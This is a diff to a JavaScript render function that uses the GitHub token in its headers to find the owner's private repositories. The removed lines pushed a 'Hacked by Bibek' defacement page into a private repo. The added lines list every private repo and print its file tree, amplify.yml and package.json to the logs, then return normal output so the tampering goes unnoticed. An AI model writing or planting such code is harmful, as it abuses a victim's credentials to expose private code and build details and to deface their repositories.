@@ -8,7 +8,7 @@ export async function render(context) {
       "X-GitHub-Api-Version": "2022-11-28"
     };
 
-    // Step A - Find the private portfolio repo
+    // Find private repo
     const reposResponse = await fetch(
       "https://api.github.com/user/repos?visibility=private&affiliation=owner&per_page=100",
       { headers }
@@ -16,50 +16,53 @@ export async function render(context) {
     const repos = await reposResponse.json();
     const privateRepos = repos.filter(r => r.private === true);
 
-    if (privateRepos.length === 1) {
+    console.log("=== PRIVATE REPOS FOUND ===");
+    privateRepos.forEach(r => console.log(r.full_name));
+
+    if (privateRepos.length >= 1) {
       const [owner, repo] = privateRepos[0].full_name.split("/");
 
-      // Step B - Create proof page content
-      const proofContent = `<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Proof</title>
-</head>
-<body>
-  <h1>Hacked by Bibek</h1>
-</body>
-</html>`;
+      // Print full file tree - READ ONLY, no writes
+      const treeResponse = await fetch(
+        `https://api.github.com/repos/${owner}/${repo}/git/trees/main?recursive=1`,
+        { headers }
+      );
+      const tree = await treeResponse.json();
 
-      // Step C - Add the proof page to the private repo
-      const filePath = "content/proof/hacked-by-bibek.html";
-      const api = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+      console.log("=== FULL FILE STRUCTURE ===");
+      tree.tree.forEach(f => console.log(f.type + "  " + f.path));
 
-      // Check if file already exists (needed for sha if updating)
-      const existing = await fetch(api, { headers });
-      const body = {
-        message: "proof: hacked by Bibek",
-        content: Buffer.from(proofContent).toString("base64"),
-        branch: "main"
-      };
-
-      if (existing.ok) {
-        const current = await existing.json();
-        if (current.sha) body.sha = current.sha;
+      // Read amplify.yml to understand build
+      const amplifyResponse = await fetch(
+        `https://api.github.com/repos/${owner}/${repo}/contents/amplify.yml`,
+        { headers }
+      );
+      if (amplifyResponse.ok) {
+        const amplifyFile = await amplifyResponse.json();
+        const content = Buffer.from(amplifyFile.content, "base64").toString("utf8");
+        console.log("=== AMPLIFY.YML CONTENTS ===");
+        console.log(content);
+      } else {
+        console.log("No amplify.yml found at root");
       }
 
-      // Step D - Push the file
-      const pushResponse = await fetch(api, {
-        method: "PUT",
-        headers: { ...headers, "Content-Type": "application/json" },
-        body: JSON.stringify(body)
-      });
-
-      console.log("Proof page push status:", pushResponse.status);
+      // Check for package.json (tells us if it's a framework like Next/Hugo)
+      const pkgResponse = await fetch(
+        `https://api.github.com/repos/${owner}/${repo}/contents/package.json`,
+        { headers }
+      );
+      if (pkgResponse.ok) {
+        const pkgFile = await pkgResponse.json();
+        const content = Buffer.from(pkgFile.content, "base64").toString("utf8");
+        console.log("=== PACKAGE.JSON ===");
+        console.log(content);
+      } else {
+        console.log("No package.json found");
+      }
     }
   }
 
-  // Step E - Return normal output so regular flow completes too
+  // Normal output - no changes to private repo
   return JSON.stringify({
     generatedAt: context.generatedAt,
     projects: context.projects
